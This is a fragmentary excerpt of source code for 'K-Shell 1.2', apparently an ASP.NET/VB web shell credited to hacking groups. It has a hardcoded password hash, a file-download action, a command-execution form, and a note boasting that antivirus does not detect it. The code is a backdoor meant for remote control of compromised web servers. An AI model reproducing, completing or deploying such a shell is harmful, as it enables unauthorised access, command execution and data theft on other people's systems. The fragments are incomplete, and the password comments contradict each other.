...
Dim PASSWORD as string = "6f8dfc61baddac626947394666e8ab07"   'Hash MD5 of password: virusscan
'Here , change the default password "tuyenkma" to yours
'----------------------------------------------------------------------
'-----------------      K-Shell by Tuyenkma BYG       -----------------
'-----------------          -----------------
'-----------------      http://www.beyeugroup.com     -------------------
'-----------------        http://kmasecuryti.net       -----------------
'-----------------              Version 1.2          ------------------
'-----------------            Build (20080818)        -----------------
'----------- This shell base on WebAdmin2.0(beta) By lake2 ------------
'------------ and Asp.Net Security Analyzer by Dinis.cruz  ------------
'---------------------Thanks to : beyeugroup  --------------------
'----------------------------------------------------------------------
'  Description:
...
<%
if request.QueryString("action")="down" and session("virusscan")=1 then
...
<body>
<div align="center">K-Shell 1.2 By <a href="http://www.guru.net.vn" target="_blank" title="Welcome to my page:)">tuyenkma</a> from <font color="red">Vietnam</font> [<a href="http://beyeugroup.com" target="_blank">BYG</a>]</div>
<hr>
<%
Dim error_x as Exception
Try
if session("virusscan")<>1 then
...
<form runat="server">
  ...
  <p>- This function has fixed by virusscan.Antivirus has not detected (2007/02/27)-</p>
  Command:
...
%>
    ...
    <div>
    	C# coded by Hackwol & Lenk, VB edit by tuyenkma (2011)<br /><br />
